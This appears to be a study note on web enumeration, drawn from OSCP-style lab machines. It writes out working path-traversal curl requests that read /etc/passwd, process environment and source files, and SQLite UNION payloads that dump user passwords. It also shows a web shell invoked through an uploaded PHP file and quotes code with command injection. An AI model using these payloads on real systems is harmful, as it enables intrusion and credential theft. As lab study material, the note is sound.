---
type: methodology
project: OSCP-Exam-PoC
status: drafted
updated: "2026-11-07"
tags:
  - methodology
  - web-enumeration
  - http
  - file-upload
  - path-traversal
  - sql-injection
  - oscp
---

# Web Enumeration

## 1. Purpose

Web enumeration identifies how a web application processes user input, handles files, implements authentication, and communicates with its backend.

The objective is to move beyond identifying that a website exists and determine:

- Which endpoints are exposed.
    
- Which parameters influence application behavior.
    
- Which HTTP methods and headers are accepted.
    
- How input is validated and processed.
    
- Whether file operations are restricted correctly.
    
- Whether database queries are vulnerable to injection.
    
- Whether application configuration or source code is exposed.
    
- Whether an identified weakness can provide an initial foothold.
    

This document covers web-specific enumeration techniques observed during the IT GATE Academy examination.

General service discovery and initial fingerprinting are documented in [[Reconnaissance]].

## 2. Web Enumeration Workflow

Use the following sequence:

1. Inspect the landing page and identify application functionality.
    
2. Map forms, endpoints, parameters, and HTTP methods.
    
3. Capture a legitimate baseline request.
    
4. Identify how the application handles each input.
    
5. Test one validation boundary at a time.
    
6. Compare successful, unsuccessful, and unexpected responses.
    
7. Investigate exposed files, source code, and configuration when justified.
    
8. Establish whether the finding provides information disclosure, authentication bypass, or code execution.
    
9. Preserve evidence and document the resulting attack path.
    

```
Landing Page
     |
     v
Application Functionality
     |
     v
Endpoints / Parameters / Methods
     |
     v
Legitimate Baseline Request
     |
     v
Input Validation Analysis
     |
     +-------------------+
     |                   |
     v                   v
File Operations      Database Queries
     |                   |
     v                   v
Upload / Download    SQL Injection Testing
     |                   |
     +---------+---------+
               |
               v
       Backend Investigation
               |
               v
     Confirmed Security Finding
               |
               v
       Initial Access Strategy
```

## 3. Map the Application Before Testing

Start by understanding what the application is designed to do.

Inspect:

- Visible forms and input fields.
    
- Query-string parameters.
    
- File upload and download functionality.
    
- Authentication and authorization requirements.
    
- API endpoints.
    
- HTTP headers.
    
- Error messages.
    
- Links and static resources.
    
- Any implementation hints exposed by the application.
    

Create an endpoint inventory.

|Property|Information to record|
|---|---|
|Endpoint|URL path|
|Method|GET, POST, PUT, etc.|
|Parameter|Query, body, or form parameter|
|Input type|String, filename, URL, identifier, etc.|
|Authentication|Required or not required|
|Normal behavior|Expected response|
|Interesting behavior|Validation errors, unexpected output, etc.|
|Status|Untested, suspected, or confirmed|

### Examination examples

**VE-01 — File upload**

The application exposed a file-upload feature.

The investigation focused on how the application validated uploaded files and where it made them accessible.

**EA-01 — Search functionality**

The application exposed a search parameter:

```
/?q=
```

The result page displayed two fields:

```
Name
Bio
```

This was useful information for constructing a controlled SQL injection test.

**ME-01 — File Service**

The homepage documented two endpoints:

```
GET /api/download?file=welcome.txt
GET /api/ping?host=1.1.1.1
```

The second endpoint explicitly required an `X-API-Key` header.

The endpoint inventory immediately suggested two separate investigation paths:

|Endpoint|Input|Initial hypothesis|
|---|---|---|
|`/api/download`|`file`|File path handling|
|`/api/ping`|`host`|Input processing and authentication|

These were hypotheses, not confirmed vulnerabilities at the beginning of the investigation.

## 4. File Upload Enumeration

File upload functionality can expose a route to server-side code execution when validation and storage controls are inadequate.

The important questions are:

1. What does the upload request look like?
    
2. Which filename extensions are accepted?
    
3. Does the application validate MIME types?
    
4. Where is the uploaded file stored?
    
5. How does the server handle requests to the uploaded file?
    
6. Is the uploaded content interpreted as executable code or served as a static file?
    

### 4.1 Inspect a legitimate upload first

Upload an ordinary image and capture the request.

Record:

- HTTP method.
    
- Upload endpoint.
    
- Multipart form field name.
    
- Original filename.
    
- `Content-Type`.
    
- Request body.
    
- Server response.
    
- Returned file location.
    

A multipart upload commonly resembles:

```
POST /upload HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

[FILE CONTENT]
------Boundary--
```

The values above are illustrative. Use the actual request produced by the application.

Do not assume the upload parameter is named `file`, or that the destination directory is `/uploads`.

### 4.2 Understand file validation

Test validation mechanisms individually.

Potential validation layers include:

|Layer|What to investigate|
|---|---|
|Extension|Whether the filename suffix is restricted|
|MIME type|Whether the declared content type is checked|
|File signature|Whether the actual file contents are inspected|
|Filename|Whether path components or special characters are accepted|
|Storage location|Whether uploaded files are stored outside the web root|
|Execution policy|Whether the destination permits server-side script execution|

A change to the request's MIME type does not establish that the server will execute the uploaded file.

Likewise, successful upload acceptance does not establish code execution.

### 4.3 Verify server-side execution

Use a harmless execution marker:

```
<?php
echo "UPLOAD_EXECUTION_TEST";
?>
```

If the application accepts the test file:

1. Identify its actual URL.
    
2. Request the uploaded file.
    
3. Inspect the response.
    
4. Determine whether the marker is executed or whether the source code is returned as text.
    

If the server returns the PHP source, execution has not been established.

If the marker appears as generated output, PHP interpretation is confirmed.

### 4.4 Examination example: VE-01

The investigation confirmed that the uploaded PHP file was accessible at:

```
/uploads/file.php
```

The following URL returned:

```
/var/www/html/uploads
```

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=pwd
```

This established two important facts:

- The uploaded PHP file was being interpreted by the web server.
    
- The `cmd` parameter influenced a server-side command execution operation.
    

The command-execution identity and subsequent access path belong in [[Initial Access]] and the machine-specific document [[VE-01 Overview]].

### 4.5 Reproducing multipart requests with curl

When Burp is unavailable, curl can construct multipart requests.

General structure:

```
curl -i \
  -F 'file=@./image.jpg' \
  'http://TARGET/upload'
```

|Option|Purpose|
|---|---|
|`-i`|Include response headers|
|`-F`|Construct a multipart/form-data request|
|`file=`|Form field name; replace with the application's actual field|
|`@./image.jpg`|Read the specified local file and attach it|
|URL|Actual upload endpoint|

For a multipart request, curl generates the appropriate boundary and request headers.

Use the application's actual parameter name and endpoint rather than copying the illustrative values.

Related note: [[Initial Access]].

## 5. File Download Enumeration and Path Traversal

Download endpoints deserve special attention because they often accept filenames or paths that are later passed to filesystem operations.

The fundamental question is:

**Does the application restrict file access to the intended download directory?**

### 5.1 Establish normal download behavior

ME-01 exposed:

```
GET /api/download?file=welcome.txt
```

The baseline request was:

```
curl -i \
  'http://x.x.x.x:PORT_I/api/download?file=welcome.txt'
```

Confirmed response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: application/octet-stream
Content-Length: 161
```

The response body identified the public-share directory and described the endpoint's intended functionality.

This established the normal behavior before testing traversal.

### 5.2 Test path traversal

The next request attempted to access a file outside the public-share directory:

```
curl -i --get \
  --data-urlencode 'file=../../../../etc/passwd' \
  'http://x.x.x.x:PORT_I/api/download'
```

Parameter breakdown:

|Element|Purpose|
|---|---|
|`-i`|Include response headers|
|`--get`|Place the supplied data in the URL query string|
|`--data-urlencode`|Encode the parameter value|
|`file=`|Supply the filename parameter|
|`../../../../etc/passwd`|Attempt to traverse outside the intended directory|

The application returned:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 876
```

The response contained the actual contents of `/etc/passwd`.

<badge color="success">Confirmed finding</badge>

This established arbitrary file disclosure through directory traversal.

### 5.3 What the result revealed

Among the returned account entries was:

```
svc:x:1000:1000::/home/svc:/bin/bash
```

This disclosed:

|Property|Value|
|---|---|
|Username|`svc`|
|UID|`1000`|
|GID|`1000`|
|Home directory|`/home/svc`|
|Login shell|`/bin/bash`|

The same vulnerability was subsequently used to retrieve:

```
/home/svc/user.txt
```

This demonstrated that the application could read files outside its intended public-share directory, subject to the permissions of its own process.

### 5.4 Understand the response, not just the status code

|Observation|Interpretation|
|---|---|
|`200 OK` with requested file contents|File read confirmed|
|`404 Not Found`|File not found, inaccessible, or error translated into 404|
|`403 Forbidden`|Access explicitly denied|
|`400 Bad Request`|Input rejected or malformed|
|`200 OK` with unrelated content|Investigate normalization, filtering, and parameter handling|

Do not assume that a 404 response necessarily proves filesystem permissions denied access.

The application may convert different filesystem errors into the same HTTP response.

### 5.5 Inspect process information through file disclosure

Once arbitrary file read is confirmed, Linux process information may reveal how the web application is running.

Useful targets include:

```
/proc/self/status
/proc/self/environ
/proc/self/cmdline
```

Example:

```
curl -sS --get \
  --data-urlencode 'file=../../../../proc/self/status' \
  'http://TARGET/api/download'
```

The `Uid`, `Gid`, and `CapEff` fields can help identify the process's execution context and effective capabilities.

Environment variables can be inspected with:

```
curl -sS --get \
  --data-urlencode 'file=../../../../proc/self/environ' \
  'http://TARGET/api/download' | tr '\0' '\n'
```

`/proc/self/environ` uses NUL-byte separators. `tr` converts those separators to newlines for readability.

The process command line can be inspected with:

```
curl -sS --get \
  --data-urlencode 'file=../../../../proc/self/cmdline' \
  'http://TARGET/api/download' | tr '\0' ' '
```

These files can reveal:

- Process identity.
    
- Working directory clues.
    
- Application startup arguments.
    
- Python or other application modules.
    
- Potential environment-based secrets.
    

Treat discovered values as evidence to investigate, not automatic proof of a vulnerability.

### 5.6 Examination example: ME-01 application discovery

The process environment exposed:

```
USER=svc
HOSTNAME=medium
HOME=/home/svc
PWD=/opt/svcapp
```

It did not expose an obvious application API key.

The process command line returned:

```
/usr/local/bin/python3.11
/usr/local/bin/gunicorn
--access-logfile -
-w 2
-b 0.0.0.0:5000
app:app
```

Combining the two results suggested the application module was located at:

```
/opt/svcapp/app.py
```

The application source was then retrieved through the same file disclosure vulnerability.

This was more effective than guessing filenames or searching randomly.

Related machine document: [[ME-01 Overview]].

## 6. SQL Injection Enumeration

SQL injection testing should be based on the application's query behavior and the structure of its output.

EA-01 provided a useful example involving a search endpoint.

### 6.1 Identify the vulnerable parameter

The application exposed:

```
/?q=
```

An initial test used:

```
/?q='--+
```

The application displayed all search results without a normal search term.

This was an injection indicator, but it was not yet sufficient to understand the database query.

The next step was to examine the expected SQL result structure.

### 6.2 Determine the number of selected columns

The visible result displayed two fields:

|Column|Displayed field|
|---|---|
|1|Name|
|2|Bio|

This suggested that the original query returned two columns.

A UNION-based test therefore needed to return two compatible columns.

General principle:

```
SELECT column1, column2
UNION
SELECT value1, value2;
```

The number of columns in the injected SELECT must match the original query.

The returned expressions must also be compatible with the corresponding result types.

### 6.3 Identify the database engine

Initial attempts using MySQL metadata tables failed.

Rather than continuing to assume MySQL, the investigation tested SQLite metadata:

```
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -
```

The response included table definitions for:

```
members
users
```

The returned schema showed that `users` contained:

```
id
username
password
```

<badge color="success">Database engine identified</badge>

This confirmed SQLite and provided the schema needed for the next query.

### 6.4 Retrieve the relevant records

The next query selected the two useful columns:

```
' UNION SELECT username, password FROM users-- -
```

The application displayed the results through its existing Name and Bio fields.

This demonstrated the importance of correlating the injected output with the application's original rendering structure.

### 6.5 Examination lessons

The EA-01 investigation established the following workflow:

1. Identify the search parameter.
    
2. Observe the normal application output.
    
3. Test whether input alters query behavior.
    
4. Determine the original column count.
    
5. Check whether the database engine is known.
    
6. Enumerate database tables using engine-specific metadata.
    
7. Inspect the relevant table schema.
    
8. Select only the columns required for the objective.
    
9. Validate retrieved values before using them for authentication.
    

Do not assume that database usernames correspond to operating-system users.

Likewise, a database credential is not automatically a valid SSH credential. Authentication reuse must be tested separately.

See [[EA-01 Overview]] and [[Initial Access]].

## 7. Inspect Application Source and Configuration

When file disclosure reveals the application's working directory and startup command, source-code inspection can replace guesswork with direct evidence.

### 7.1 Identify the application module

In ME-01, the following values were observed:

```
PWD=/opt/svcapp
```

And:

```
app:app
```

The latter was part of the Gunicorn startup command.

This suggested the application module was:

```
/opt/svcapp/app.py
```

The following request successfully retrieved it:

```
curl -i --get \
  --data-urlencode 'file=../../../../opt/svcapp/app.py' \
  'http://x.x.x.x:PORT_I/api/download'
```

### 7.2 Read code to understand behavior

The retrieved source contained:

```
from flask import Flask, request, Response, abort

from config import API_KEY

app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))
PUBLIC = os.path.join(BASE, "public")
```

This exposed a new investigation target:

```
/opt/svcapp/config.py
```

The source also included the download implementation:

```
f = request.args.get("file", "")
path = os.path.join(PUBLIC, f)

try:
    with open(path, "rb") as fh:
        data = fh.read()
except OSError:
    abort(404)

return Response(data, mimetype="application/octet-stream")
```

The code confirmed the absence of a path containment check.

Joining the public directory with attacker-controlled input did not guarantee that the resolved path remained inside the public directory.

The same source revealed the diagnostics endpoint:

```
if request.headers.get("X-API-Key") != API_KEY:
    abort(401)

host = request.args.get("host", "")
out = subprocess.getoutput("ping -c 1 -W 1 " + host)
```

Two independent weaknesses were now directly visible:

1. Path traversal in the download implementation.
    
2. OS command injection in the diagnostics implementation.
    

The source explicitly imported `API_KEY` from `config`, so inspecting that configuration file was a more evidence-based next step than guessing at unrelated environment variables.

### 7.3 Authentication boundary testing

Before obtaining the API key, the diagnostics endpoint was requested without the required header:

```
curl -i --get \
  --data-urlencode 'host=1.1.1.1' \
  'http://x.x.x.x:PORT_I/api/ping'
```

The response was:

```
HTTP/1.1 401 UNAUTHORIZED
```

This confirmed that unauthenticated requests were rejected.

It did not establish that the endpoint was safe from command injection. Authentication enforcement and input handling are separate security properties.

### 7.4 Use source evidence to guide the next request

Once the source code identifies a configuration import, follow the actual import path.

Do not continue guessing at secret names.

This approach generalizes:

- Identify the application module.
    
- Identify imported configuration modules.
    
- Inspect relevant files.
    
- Confirm how secrets are loaded.
    
- Trace how user-controlled values reach sensitive functions.
    

The objective is to reconstruct the actual data flow.

## 8. HTTP Request Manipulation Without Burp

Burp Suite is useful, but it is not the only way to inspect and reproduce HTTP traffic.

The ME-01 investigation used curl because the VPN and proxy setup made interception inconvenient.

The same request analysis can be performed with curl, browser developer tools, Python Requests, or raw HTTP clients.

### 8.1 Add custom HTTP headers

For an authenticated endpoint:

```
curl -i \
  -H 'X-API-Key: YOUR_API_KEY' \
  --get \
  --data-urlencode 'host=1.1.1.1' \
  'http://TARGET/api/ping'
```

The important option is:

```
-H
```

It adds an HTTP request header.

The `--get` and `--data-urlencode` options construct the query string separately.

This allows the two relevant parts of the request to be controlled separately:

- Authentication header.
    
- User-controlled query parameter.
    

### 8.2 Use verbose mode when needed

```
curl -v \
  'http://TARGET/'
```

Verbose mode helps inspect:

- Connection establishment.
    
- Request method.
    
- Request headers.
    
- Response headers.
    
- TLS and connection errors.
    

Avoid exposing authentication tokens when sharing verbose output.

### 8.3 Preserve response bodies

To save a response locally:

```
curl -sS \
  -o response.bin \
  'http://TARGET/api/download?file=welcome.txt'
```

To use a server-supplied filename:

```
curl -OJ \
  'http://TARGET/api/download?file=welcome.txt'
```

Important distinctions:

|Option|Behavior|
|---|---|
|`-o filename`|Save the response under a specified local filename|
|`-O`|Use a filename derived from the URL|
|`-J`|Use the filename supplied by the server's Content-Disposition header|
|`-i`|Print response headers and body|

A download response does not mean the browser or curl is reading a file from the local machine. The server resolves the requested path and returns the response content.

## 9. Common Web Enumeration Mistakes

### 9.1 Guessing the backend before testing it

EA-01 demonstrated why database-specific enumeration should follow evidence.

The MySQL metadata queries failed, while SQLite's `sqlite_master` exposed the actual schema.

The database engine should be identified, not assumed.

### 9.2 Confusing response behavior with vulnerability confirmation

A page displaying all search results after a quote/comment payload is an indicator.

A reliable SQL injection demonstration should establish that controlled SQL expressions influence the returned data.

Similarly, a successful upload does not establish code execution, and a download endpoint returning 200 does not prove arbitrary file read.

### 9.3 Assuming a custom header means the endpoint is safe

ME-01's `X-API-Key` requirement enforced an authentication boundary.

However, the authenticated endpoint still contained a separate unsafe command construction operation.

Authentication does not replace input validation or safe command execution.

### 9.4 Guessing secrets before understanding configuration

The `GPG_KEY` environment variable initially appeared potentially interesting.

The stronger evidence was the application source:

```
from config import API_KEY
```

This identified the actual configuration module.

Follow source-code references rather than relying on superficial similarities between variable names.

### 9.5 Treating file disclosure as root access

The ME-01 process was running as UID 1000 (`svc`).

The ability to read files through the web application was limited by the privileges and filesystem context of that application process.

Arbitrary file read does not automatically establish root access.

### 9.6 Using a tool without understanding its output

The investigation used curl, but each request needed to be understood at the HTTP level:

- What method was sent?
    
- Where was the parameter placed?
    
- Was the value URL-encoded?
    
- Was a custom header included?
    
- Were response headers visible?
    
- Was the response saved or printed?
    

Tool proficiency requires understanding the request and response, not merely executing commands.

## 10. Web Enumeration Completion Criteria

- Landing page and visible functionality inspected.
    
- Endpoints and parameters recorded.
    
- HTTP methods identified.
    
- Legitimate baseline requests captured.
    
- Input validation behavior investigated.
    
- File upload handling tested where applicable.
    
- File download handling tested where applicable.
    
- SQL injection hypotheses tested with controlled inputs where applicable.
    
- Authentication requirements recorded.
    
- Relevant response headers and bodies preserved.
    
- Application source or configuration inspected when evidence justifies it.
    
- Confirmed vulnerabilities distinguished from hypotheses.
    
- Findings linked to the machine-specific documentation.
    

## 11. Related Notes

### Machine Documentation

- [[VE-01 Overview]]
    
- [[EA-01 Overview]]
    
- [[ME-01 Overview]]
    

### Methodology

- [[Reconnaissance]]
    
- [[Initial Access]]
    
- [[SSRF]]
    
- [[Deserialization]]
    
- [[Evidence Collection]]
    

### Difficulties and Lessons

- [[Network and ISP Restrictions]]
    
- [[HTTP Client and Connectivity Failures]]
    
- [[Fuzzing Strategy and False Leads]]
    

